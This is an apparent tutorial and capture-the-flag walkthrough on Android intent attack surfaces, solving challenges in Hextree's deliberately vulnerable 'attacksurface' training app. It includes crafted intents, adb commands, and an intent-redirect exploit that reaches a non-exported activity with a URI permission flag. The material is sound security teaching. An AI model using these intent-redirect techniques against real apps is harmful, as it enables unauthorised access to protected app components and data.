---
title: "Intent attack surface"
weight: 4
description: "Learn about Android Intent attack surfaces, how to start activities, handle incoming intents, and send intents using adb for penetration testing."
---

## Introduction

An intent is an object designed to facilitate communication between components of Android Applications.

It is used to start **activities**, **services** or deliver a broadcast to a **receiver**.

An intent encapsulate various type of information:

* **action request**
* **category**
* **type**
* **data**
* **flags**

It can be:

1. **explicit** (specifies the exact component)

Use case: Starting a specific Activity or Service in the same app.

```java
Intent intent = new Intent(this, SecondActivity.class);
intent.putExtra("username", "Alice");
startActivity(intent);
```

2. **implicit** (does not specify a component name)

Use case: Open a web page, send an email, share content, take a photo, etc.

```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("https://www.example.com"));
startActivity(intent);
```

**Incoming Intent**

`getIntent()` is a method in Android used to retrieve the **Intent.**

---

## Send intent with adb

```sh
# Syntax
adb shell am start -a <ACTION> -d <DATA> -n <PACKAGE>/<CLASS-COMPONENT>

# Example
adb shell am start -a com.package.action.GIVE_FLAG -d "https://test.com" -n com.package/com.package.test.MainActivity
```

---

## Examples

### Basic exported activity

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag1Activity"
    android:exported="true"/>
```

To start this activity you can send an intent as follows:

```java
// 1 way
Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag2Activity"
));
intent.setAction("io.hextree.action.GIVE_FLAG");
startActivity(intent);
```

```java
// 2 way
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity");
startActivity(intent);
```

---

### Intent with specific action

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag2Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
    </intent-filter>
</activity>
```

```java
public class Flag2Activity extends AppCompactActivity {
    public Flag2Activity() {
        ...
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        ...
        String action = getIntent().getAction();
        if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
            return;
        }
        ...
        success(this);
    }
}
```

To start this activity you can send an intent as follows:

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag2Activity"
));
intent.setAction("io.hextree.action.GIVE_FLAG");
startActivity(intent);
```

---

### Intent with data URI

Let's say that the app `io.hextree.attacksurface` has the following activitiy:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag3Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
        <data android:scheme="https"/>
    </intent-filter>
</activity>
```

```java
public class Flag3Activity extends AppCompactActivity {
    public Flag3Activity() {
        ...
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        ...
        Intent intent = getIntent();
        String action = intent.getAction();
        if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
            return;
        }
        this.f182f.addTag(action);
        Uri data = intent.getData();
        if (data == null || !data.toString().equals("https://app.hextree.io/map/android")) {
            return;
        }
        ...
        success(this);
    }
}
```

To start this activity you can send an intent as follows:

```java
Intent intent = new Intent();
intent.setAction("io.hextree.action.GIVE_FLAG");
intent.setData(Uri.parse("https://app.hextree.io/map/android"));
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag3Activity"
));
startActivity(intent);
```

---

### Multiple intents

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag4Activity"
    android:exported="true"/>
```

```java
public class Flag4Activity extends AppCompactActivity {
    public Flag4Activity() {
        ...
    }

    public enum State {
        ...
    }

    protected void onCreate(Bundle bundle) {
        ...
        stateMachine(getIntent());
    }

    private State getCurrentState() {
        ...
    }

    private void setCurrentState(State state) {
        ...
    }

    public void stateMachine(Intent intent) {
        String action = intent.getAction();
        int iOrdinal = getCurrentState().ordinal();
        if (iOrdinal != 0) {
            if (iOrdinal != 1) {
                if (iOrdinal != 2) {
                    if (iOrdinal == 3) {
                        this.f182f.addTag(State.GET_FLAG);
                        setCurrentState(State.INIT);
                        success(this);
                        Log.i("Flag4StateMachine", "solved");
                        return;
                    }
                    if (iOrdinal == 4 && "INIT_ACTION".equals(action)) {
                        setCurrentState(State.INIT);
                        Toast.makeText(this, "Transitioned from REVERT to INIT", 0).show();
                        Log.i("Flag4StateMachine", "Transitioned from REVERT to INIT");
                        return;
                    }
                } else if ("GET_FLAG_ACTION".equals(action)) {
                    setCurrentState(State.GET_FLAG);
                    Toast.makeText(this, "Transitioned from BUILD to GET_FLAG", 0).show();
                    Log.i("Flag4StateMachine", "Transitioned from BUILD to GET_FLAG");
                    return;
                }
            } else if ("BUILD_ACTION".equals(action)) {
                setCurrentState(State.BUILD);
                Toast.makeText(this, "Transitioned from PREPARE to BUILD", 0).show();
                Log.i("Flag4StateMachine", "Transitioned from PREPARE to BUILD");
                return;
            }
        } else if ("PREPARE_ACTION".equals(action)) {
            setCurrentState(State.PREPARE);
            Toast.makeText(this, "Transitioned from INIT to PREPARE", 0).show();
            Log.i("Flag4StateMachine", "Transitioned from INIT to PREPARE");
            return;
        }
        Toast.makeText(this, "Unknown state. Transitioned to INIT", 0).show();
        Log.i("Flag4StateMachine", "Unknown state. Transitioned to INIT");
        setCurrentState(State.INIT);
    }
```

To get the flag in this case you need to send more than one intent.

1 intent:

```java
Intent intent = new Intent();
intent.setAction("PREPARE_ACTION");
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag4Activity"
));
startActivity(intent);
```

2 intent:

```java
Intent intent = new Intent();
intent.setAction("BUILD_ACTION");
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag4Activity"
));
startActivity(intent);
```

3 intent:

```java
Intent intent = new Intent();
intent.setAction("GET_FLAG_ACTION");
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag4Activity"
));
startActivity(intent);
```

4 intent:

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag4Activity"
));
startActivity(intent);
```

---

### Innested intents

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag5Activity"
    android:exported="true"/>
```

```java
public class Flag5Activity extends AppCompactActivity {
    Intent nextIntent = null;

    public Flag5Activity() {
        ...
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f182f = new LogHelper(this);
        Intent intent = getIntent();
        Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
        if (intent2 == null || intent2.getIntExtra("return", -1) != 42) {
            return;
        }
        this.f182f.addTag(42);
        Intent intent3 = (Intent) intent2.getParcelableExtra("nextIntent");
        this.nextIntent = intent3;
        if (intent3 == null || intent3.getStringExtra("reason") == null) {
            return;
        }
        this.f182f.addTag("nextIntent");
        if (this.nextIntent.getStringExtra("reason").equals("back")) {
            this.f182f.addTag(this.nextIntent.getStringExtra("reason"));
            success(this);
        } else if (this.nextIntent.getStringExtra("reason").equals("next")) {
            intent.replaceExtras(new Bundle());
            startActivity(this.nextIntent);
        }
    }
}
```

To solve this challenge you can send an intent as follows:

```java
Intent thirdIntent = new Intent();
thirdIntent.putExtra("reason", "back");

Intent secondIntent = new Intent();
secondIntent.putExtra("return", 42);
secondIntent.putExtra("nextIntent", thirdIntent);

Intent firstIntent = new Intent();
firstIntent.putExtra("android.intent.extra.INTENT", secondIntent);
firstIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag5Activity"
));
startActivity(firstIntent);
```

---

### Other threat surface

The most common way for an attack to happen is through the `onCreate()` method, which handles the incoming intent from `getIntent()`. But the activity lifecycle is a bit more complicated, so there might be other ways that a threat could be introduced.

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag7Activity"
    android:exported="true"/>
```

```java
public class Flag7Activity extends AppCompactActivity {
    public Flag7Activity() {
        ...
    }

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (this.f182f == null) {
            this.f182f = new LogHelper(this);
        }
        String action = getIntent().getAction();
        if (action == null || !action.equals("OPEN")) {
            return;
        }
        this.f182f.addTag("OPEN");
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        String action = intent.getAction();
        if (action == null || !action.equals("REOPEN")) {
            return;
        }
        this.f182f.addTag("REOPEN");
        success(this);
    }
}
```

To get this flag we need to find a way to execute the `onNewIntent` method. If you read the documentation (https://developer.android.com/reference/android/app/Activity#onNewIntent(android.content.Intent)) you can see that:

> This is called for activities that set launchMode to "singleTop" in their package, or if a client used the `Intent.FLAG_ACTIVITY_SINGLE_TOP` flag when calling `startActivity(Intent)`.

To solve this challenge you can send the following intents:

```java
Intent firstIntent = new Intent();
firstIntent.setAction("OPEN");

firstIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag7Activity"
));
startActivity(firstIntent);

// Wait for the app to start
try {
    Thread.sleep(3000);
} catch (InterruptedException e) {
    throw new RuntimeException(e);
}

Intent secondIntent = new Intent();
secondIntent.setAction("REOPEN");
secondIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
secondIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag7Activity"
));
startActivity(secondIntent);
```

---

## Vulnerabilities

### Intent redirect

An *Intent Redirect* vulnerability means that an attacker can control the intent used by the other app to for example start an activity.

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag6Activity"
    android:exported="false"/>
```

```java
public class Flag6Activity extends AppCompactActivity {
    public Flag6Activity() {
        ...
    }

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f182f = new LogHelper(this);
        if ((getIntent().getFlags() & 1) != 0) {
            this.f182f.addTag("FLAG_GRANT_READ_URI_PERMISSION");
            success(this);
        }
    }
}
```

You can't start this activity from another app because it's not exported. However, "not exported activities" can be started internally by the app itself.

If we have a `startActivity` within the app where the attacker controls the intent we can craft an intent that when passed to `startActivity`, leads to the non-exported activity.

The [Innested intents](intent%20attack%20surface.html#innested-intents) chapter includes a useful code:

```java
...
} else if (this.nextIntent.getStringExtra("reason").equals("next")) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);
...
```

To start this activity you can send an intent as follows:

```java
Intent thirdIntent = new Intent();
thirdIntent.putExtra("reason", "next");
thirdIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag6Activity"
));
thirdIntent.addFlags(1);

Intent secondIntent = new Intent();
secondIntent.putExtra("return", 42);
secondIntent.putExtra("nextIntent", thirdIntent);

Intent firstIntent = new Intent();
firstIntent.putExtra("android.intent.extra.INTENT", secondIntent);
firstIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag5Activity"
));
startActivity(firstIntent);
```

